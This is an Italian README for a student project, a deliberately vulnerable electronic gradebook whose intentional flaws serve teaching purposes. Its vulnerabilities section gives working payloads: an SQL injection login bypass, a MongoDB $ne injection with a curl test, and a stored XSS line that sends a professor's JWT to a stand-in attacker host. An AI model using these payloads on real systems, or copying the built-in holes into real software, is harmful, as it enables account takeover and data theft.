# ClasseMorta

Progetto TPSIT 5INB - Registro elettronico didattico, ispirato a ClasseViva.
**Attenzione:** il progetto include alcune vulnerabilità *volontarie* (SQL/NoSQL
injection e Stored XSS) per scopi puramente didattici. **NON usare in produzione.**

---

## Stack

| Componente | Tecnologia |
|------------|------------|
| Backend    | PHP 8.2 + Apache (REST API in JSON) |
| Frontend   | HTML / CSS personalizzato / JavaScript vanilla |
| RDBMS      | PostgreSQL (Neon) - utenti, classi, verifiche |
| NoSQL      | MongoDB Atlas - voti |
| Sessioni   | JWT (HS256) firmato con `JWT_SECRET` |
| Async      | `fetch` + `XMLHttpRequest` (entrambi presenti) |
| Container  | Docker Compose (Apache + Nginx) |

---

## Avvio locale

```bash
docker-compose up --build
```

| Servizio | URL                     |
|----------|-------------------------|
| Frontend | http://localhost:3000   |
| Backend  | http://localhost:8080   |

> Lo `schema.sql` è già caricato su Neon. Se vuoi resettare la base dati,
> esegui di nuovo `schema.sql` su Postgres.

---

## Credenziali demo

**Professori** (login con ruolo *Professore*)

| Email | Password |
|-------|----------|
| mario.rossi@scuola.it | prof123 |
| elena.bianchi@scuola.it | prof123 |

**Studenti** (login con ruolo *Studente*)

| Email | Password | Classe |
|-------|----------|--------|
| luca.verdi@studenti.it | studente1 | 5A |
| sofia.neri@studenti.it | studente2 | 5A |
| marco.gialli@studenti.it | studente3 | 4B |
| anna.blu@studenti.it | studente4 | 4B |

---

## Struttura

```
ClasseMorta/
├── backend/
│   ├── index.php                  # Router REST
│   ├── Dockerfile                 # PHP 8.2 + pdo_pgsql + mongodb
│   ├── .htaccess                  # Apache rewrite -> index.php
│   └── src/
│       ├── Controllers/
│       │   ├── AuthController.php       (SQL injection)
│       │   ├── StudentiController.php
│       │   ├── VotiController.php       (NoSQL injection)
│       │   └── VerificheController.php  (Stored XSS)
│       ├── Models/
│       │   ├── Utenti.php
│       │   ├── Voti.php
│       │   └── Verifiche.php
│       └── helpers/
│           ├── db.php       (PDO Postgres + .env loader)
│           ├── mongo.php    (driver MongoDB low-level)
│           └── jwt.php      (encode/decode + middleware)
├── frontend/
│   ├── assets/
│   │   ├── logo.png
│   │   └── style.css
│   ├── app.js                     # Auth, fetch, XHR, navbar
│   ├── index.html                 # Redirect intelligente
│   ├── login.html                 # Login (POST /api/login)
│   ├── dashboard.html             # Pannello prof / studente
│   ├── studenti.html              # (XHR) elenco studenti per classe
│   ├── voti.html                  # Gestione voti (prof)
│   ├── voti-studente.html         # I miei voti (studente)
│   ├── verifiche.html             # Lista verifiche
│   ├── crea-verifica.html         # Creazione verifica (prof)
│   ├── verifica.html              # Svolgimento (studente)
│   └── risposte.html              # Review risposte (prof) - XSS sink
├── schema.sql
├── docker-compose.yml
└── .env                           # PG, MONGO_URI, JWT_SECRET
```

---

## API REST

Tutte le risposte sono in JSON. Le rotte protette richiedono header
`Authorization: Bearer <token>`.

| Metodo | Endpoint | Ruolo | Descrizione |
|--------|----------|-------|-------------|
| POST   | `/api/login` | pubblico | Login (`{email, password, ruolo}`). Restituisce JWT. |
| GET    | `/api/me`    | auth | Dati dell'utente loggato dal token |
| GET    | `/api/classi` | prof | Classi e materie insegnate dal prof loggato |
| GET    | `/api/studenti?classe=5A` | prof | Studenti della classe |
| GET    | `/api/studenti/:id` | prof | Singolo studente |
| GET    | `/api/voti?studente_id=:id` | prof / studente | Voti dello studente (Mongo) |
| GET    | `/api/voti/me` | studente | Voti propri |
| POST   | `/api/voti`    | prof | Inserisce voto |
| DELETE | `/api/voti/:id` | prof | Elimina voto |
| GET    | `/api/verifiche` | auth | Verifiche (lista contestuale al ruolo) |
| POST   | `/api/verifiche` | prof | Crea verifica con domande |
| GET    | `/api/verifiche/:id` | auth | Dettaglio verifica + domande |
| POST   | `/api/verifiche/:id/risposte` | studente | Consegna risposte |
| GET    | `/api/verifiche/:id/risposte` | prof | Tutte le risposte |

---

## Vulnerabilità didattiche (volontarie)

### 1. SQL Injection - login

`backend/src/Models/Utenti.php :: loginVulnerabile()` concatena email e
password direttamente nella query:

```sql
SELECT * FROM <tabella> WHERE email = '$email' AND password = '$password' LIMIT 1
```

**Payload demo** (login come professore):

| Campo    | Valore |
|----------|--------|
| Ruolo    | Professore |
| Email    | `' OR '1'='1' --` |
| Password | qualsiasi |

Il primo professore in tabella viene autenticato.

### 2. NoSQL Injection - voti

`backend/src/Controllers/VotiController.php :: lista()` passa direttamente
il valore di `$_GET['studente_id']` al filtro Mongo. Un client può
trasformare il parametro in un oggetto annidato:

```
GET /api/voti?studente_id[$ne]=null
```

PHP costruisce `['studente_id' => ['$ne' => null]]` ed il driver Mongo
lo interpreta come operatore: vengono restituiti **tutti i voti** di
tutti gli studenti, anche da uno studente "normale" se è loggato.

Test rapido:

```bash
curl -H "Authorization: Bearer <jwt-studente>" \
     "http://localhost:8080/api/voti?studente_id\[%24ne\]=null"
```

### 3. Stored XSS - risposte verifica

In `frontend/risposte.html` le risposte degli studenti vengono inserite
con `innerHTML` senza escaping. Uno studente può consegnare:

```html
<img src=x onerror="fetch('https://attaccante.example/?t='+localStorage.getItem('classemorta_jwt'))">
```

Quando il professore apre la pagina di review, il payload viene
eseguito nel suo browser e il JWT (memorizzato in `localStorage`) viene
inviato al server dell'attaccante. Da quel momento l'attaccante può
impersonare il professore via REST.

---

## Tecnologie esplicitamente richieste dalla traccia

- **API REST**: tutto il backend (`/api/*`) è una REST API JSON.
- **Asynchronous request (XHR)**: la pagina `studenti.html` usa
  `XMLHttpRequest` (vedi `apiXHR()` in `app.js`). Le altre pagine
  usano `fetch`, anch'esso asincrono.

---

## Reset MongoDB

Per ripulire la collection `voti` durante lo sviluppo:

```js
// dalla shell mongosh
use classemorta
db.voti.drop()
```

I voti vengono ricreati al primo `POST /api/voti` da un professore.
